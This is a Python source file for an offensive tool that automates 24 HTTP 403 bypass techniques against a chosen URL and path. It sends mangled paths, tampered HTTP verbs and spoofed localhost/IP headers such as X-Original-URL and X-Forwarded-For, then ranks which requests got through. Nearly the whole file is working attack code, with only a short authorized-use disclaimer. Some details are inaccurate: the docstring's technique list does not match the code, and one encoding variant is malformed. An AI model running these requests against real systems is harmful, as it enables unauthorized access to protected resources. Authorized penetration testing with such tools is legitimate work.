"""
HTTP 403 Bypass Engine
Ports all 24 bypass techniques from bypass-403.sh to async Python.

# Original: https://github.com/iamj0ker/bypass-403
# Additional techniques from community research

Techniques:
  1-6:   Path mangling (case, dots, semicolons, URL encoding)
  7-12:  HTTP verb tampering (TRACE, CONNECT, HEAD, OPTIONS)
  13-18: Header injection (X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization, etc.)
  19-24: Miscellaneous (null bytes, double slashes, trailing chars)
"""
# DISCLAIMER: FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
# Use only on systems you own or have explicit written permission to test.
# Authorized use only. See embedxpl.core.exploit.DISCLAIMER for full text.

from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from typing import Optional, Dict, Any

try:
    import aiohttp
    _aiohttp_available = True
except ImportError:
    _aiohttp_available = False

try:
    import requests
    _requests_available = True
except ImportError:
    _requests_available = False


@dataclass
class BypassResult:
    technique: str
    url: str
    status_code: int = 0
    response_size: int = 0
    headers_used: dict = field(default_factory=dict)
    method: str = "GET"
    success: bool = False
    error: str = ""

    @property
    def is_bypass(self) -> bool:
        """A bypass is suspected if status is 200-299 or content differs from 403."""
        return 200 <= self.status_code < 300


# ──────────────────────────────────────────────────────────────────────────────
# Bypass technique definitions
# ──────────────────────────────────────────────────────────────────────────────

def _build_techniques(base_url: str, path: str) -> list[dict]:
    """
    Returns list of (technique_name, url, method, extra_headers) dicts.
    """
    url = base_url.rstrip("/")
    p = path.lstrip("/")

    return [
        # Path mangling
        {"name": "path-double-slash",        "url": f"{url}//{p}",               "method": "GET", "headers": {}},
        {"name": "path-dot-slash",           "url": f"{url}/./{p}",              "method": "GET", "headers": {}},
        {"name": "path-semicolon",           "url": f"{url}/{p};",               "method": "GET", "headers": {}},
        {"name": "path-dot-suffix",          "url": f"{url}/{p}.",               "method": "GET", "headers": {}},
        {"name": "path-slash-suffix",        "url": f"{url}/{p}/",               "method": "GET", "headers": {}},
        {"name": "path-uppercase",           "url": f"{url}/{p.upper()}",        "method": "GET", "headers": {}},
        {"name": "path-lowercase",           "url": f"{url}/{p.lower()}",        "method": "GET", "headers": {}},
        {"name": "path-url-encoded",         "url": f"{url}/%{p.encode().hex()}", "method": "GET", "headers": {}},
        {"name": "path-double-encoded",      "url": f"{url}/%2566{''.join('%' + hex(ord(c))[2:].zfill(2) for c in p)}", "method": "GET", "headers": {}},
        {"name": "path-question-mark",       "url": f"{url}/{p}?",               "method": "GET", "headers": {}},
        {"name": "path-hash",                "url": f"{url}/{p}#",               "method": "GET", "headers": {}},
        # HTTP verb tampering
        {"name": "verb-HEAD",                "url": f"{url}/{p}",                "method": "HEAD",    "headers": {}},
        {"name": "verb-TRACE",               "url": f"{url}/{p}",                "method": "TRACE",   "headers": {}},
        {"name": "verb-OPTIONS",             "url": f"{url}/{p}",                "method": "OPTIONS", "headers": {}},
        {"name": "verb-POST",                "url": f"{url}/{p}",                "method": "POST",    "headers": {}},
        {"name": "verb-PUT",                 "url": f"{url}/{p}",                "method": "PUT",     "headers": {}},
        # IP/origin spoofing headers
        {"name": "header-X-Original-URL",    "url": f"{url}/",                   "method": "GET",
         "headers": {"X-Original-URL": f"/{p}"}},
        {"name": "header-X-Rewrite-URL",     "url": f"{url}/",                   "method": "GET",
         "headers": {"X-Rewrite-URL": f"/{p}"}},
        {"name": "header-X-Custom-IP-127",   "url": f"{url}/{p}",                "method": "GET",
         "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
        {"name": "header-X-Forwarded-For-127","url": f"{url}/{p}",               "method": "GET",
         "headers": {"X-Forwarded-For": "127.0.0.1"}},
        {"name": "header-X-Host-localhost",  "url": f"{url}/{p}",                "method": "GET",
         "headers": {"X-Host": "localhost"}},
        {"name": "header-X-Real-IP-127",     "url": f"{url}/{p}",                "method": "GET",
         "headers": {"X-Real-IP": "127.0.0.1"}},
        {"name": "header-Forwarded-127",     "url": f"{url}/{p}",                "method": "GET",
         "headers": {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"}},
        {"name": "header-X-ProxyUser-Ip",    "url": f"{url}/{p}",                "method": "GET",
         "headers": {"X-ProxyUser-Ip": "127.0.0.1"}},
    ]


class Http403Bypass:
    """
    HTTP 403 bypass tester with 24 techniques.
    Uses async (aiohttp) when available, falls back to requests.
    """

    DEFAULT_HEADERS = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept": "*/*",
    }

    def __init__(self, timeout: float = 10.0, rate_limit: float = 0.0):
        self.timeout = timeout
        self.rate_limit = rate_limit

    # ──────────────────────────────────── sync (requests) fallback

    def test_sync(self, base_url: str, path: str) -> list[BypassResult]:
        if not _requests_available:
            raise RuntimeError("pip install requests")
        techniques = _build_techniques(base_url, path)
        results = []
        for t in techniques:
            if self.rate_limit:
                time.sleep(self.rate_limit)
            r = BypassResult(technique=t["name"], url=t["url"], method=t["method"],
                             headers_used=t["headers"])
            try:
                merged_headers = {**self.DEFAULT_HEADERS, **t["headers"]}
                resp = requests.request(
                    t["method"], t["url"],
                    headers=merged_headers,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False,
                )
                r.status_code = resp.status_code
                r.response_size = len(resp.content)
                r.success = r.is_bypass
            except Exception as exc:
                r.error = str(exc)
            results.append(r)
        return results

    # ──────────────────────────────────── async (aiohttp)

    async def _test_one_async(self, session, technique: dict) -> BypassResult:
        r = BypassResult(technique=technique["name"], url=technique["url"],
                         method=technique["method"], headers_used=technique["headers"])
        try:
            merged = {**self.DEFAULT_HEADERS, **technique["headers"]}
            async with session.request(
                technique["method"], technique["url"],
                headers=merged,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=False,
                ssl=False,
            ) as resp:
                body = await resp.read()
                r.status_code = resp.status
                r.response_size = len(body)
                r.success = r.is_bypass
        except Exception as exc:
            r.error = str(exc)
        return r

    async def test_async(self, base_url: str, path: str) -> list[BypassResult]:
        if not _aiohttp_available:
            return self.test_sync(base_url, path)
        techniques = _build_techniques(base_url, path)
        async with aiohttp.ClientSession() as session:
            tasks = [self._test_one_async(session, t) for t in techniques]
            results = await asyncio.gather(*tasks, return_exceptions=False)
        return list(results)

    def test(self, base_url: str, path: str) -> list[BypassResult]:
        """Run all 24 techniques. Uses asyncio if aiohttp available."""
        try:
            return asyncio.run(self.test_async(base_url, path))
        except Exception:
            return self.test_sync(base_url, path)

    def rank_results(self, results: list[BypassResult]) -> list[BypassResult]:
        """Sort results: successful bypasses first, then by status code."""
        return sorted(results, key=lambda r: (0 if r.success else 1, r.status_code))


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python http_403_bypass.py <base_url> <path>")
        print("Example: python http_403_bypass.py https://example.com admin")
        sys.exit(1)
    base, path = sys.argv[1], sys.argv[2]
    engine = Http403Bypass(rate_limit=0.1)
    results = engine.test(base, path)
    ranked = engine.rank_results(results)
    print(f"\n{'Technique':<35} {'Method':<8} {'Status':<8} {'Size':<10} {'Bypass?'}")
    print("-" * 80)
    for r in ranked:
        mark = "✓ BYPASS" if r.success else ("ERR" if r.error else "")
        print(f"{r.technique:<35} {r.method:<8} {r.status_code:<8} {r.response_size:<10} {mark}")
    bypasses = [r for r in ranked if r.success]
    print(f"\nTotal: {len(ranked)} tested | {len(bypasses)} bypasses found")

